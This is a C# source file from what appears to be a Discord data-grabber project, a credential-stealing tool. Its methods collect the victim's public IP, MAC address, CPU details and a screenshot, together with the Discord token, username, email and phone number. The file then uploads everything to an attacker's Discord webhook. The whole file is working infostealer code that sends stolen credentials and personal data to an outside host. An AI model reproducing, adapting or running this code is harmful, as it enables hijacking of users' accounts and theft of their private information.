using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DiscordDataGrabber.Models;
using Newtonsoft.Json;

namespace DiscordDataGrabber.Utlities
{
    public class SystemUserUtilities
    {
        private readonly HttpClient _http;

        public SystemUserUtilities()
        {
            _http = new HttpClient();
        }

        public string GetProcessorInformation()
        {
            var instances = new ManagementClass("win32_processor").GetInstances();
            var result = string.Empty;
            foreach (var managementBaseObject in instances)
            {
                var managementObject = (ManagementObject)managementBaseObject;
                var text = (string)managementObject["Name"];
                result = string.Concat(text, ", ", (string)managementObject["Caption"], ", ",
                    (string)managementObject["SocketDesignation"]);
            }

            return result;
        }

        public string GetMACAddress()
        {
            var instances = new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances();
            var text = string.Empty;
            foreach (var managementBaseObject in instances)
            {
                var managementObject = (ManagementObject)managementBaseObject;
                if (text == string.Empty && (bool)managementObject["IPEnabled"])
                    text = managementObject["MacAddress"].ToString();
                managementObject.Dispose();
            }

            return text;
        }

        public async Task<SystemUser> GetPublicIpAddress()
        {
            var request = new HttpRequestMessage(HttpMethod.Get, "https://api.ipify.org/?format=json");
            var response = await _http.SendAsync(request);

            var json = await response.Content.ReadAsStringAsync();
            return JsonConvert.DeserializeObject<SystemUser>(json);
        }

        public void TakeScreenShot()
        {
            try
            {
                Thread.Sleep(1000);
                var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                    bmp.Save(GlobalVars.ScreenPath,
                        ImageFormat.Jpeg);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }

        //BAD QUALITY CODE todo: fix that 
        public async Task<string> WrapPayloadAsync()
        {
            var utilities = new DiscordUserUtilities();

            var userInfo = await utilities.FetchAccountInformation();
            var systemUser = await GetPublicIpAddress();

            return "```\nPublic ip:" + systemUser.IpAddress + "\nMACAddress:" + GetMACAddress() + "'\nCPU:" +
                   GetProcessorInformation().Trim() + "\nToken: " + GlobalVars.Token[0] + "\nUsername:" +
                   userInfo.Username + "\nEmail: " + userInfo.Email + "\nPhone:" + userInfo.Phone + "\nDiscriminator:" +
                   userInfo.Discriminator + "```";
        }

        public async Task ProvideInformationTask()
        {
            using (_http)
            using (var dataContent = new MultipartFormDataContent())
            using (var fs = File.OpenRead(GlobalVars.ScreenPath))
            using (var streamContent = new StreamContent(fs))
            using (var fileContent = new ByteArrayContent(await streamContent.ReadAsByteArrayAsync()))
            {
                var userDataString = await WrapPayloadAsync();

                fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("multipart/form-data");
                dataContent.Add(new StringContent(string.Concat(userDataString)), "content");
                dataContent.Add(fileContent, "file", Path.GetFileName(GlobalVars.ScreenPath));
                var response = await _http.PostAsync(GlobalVars.WebHookUri, dataContent);
            }
        }
    }
}
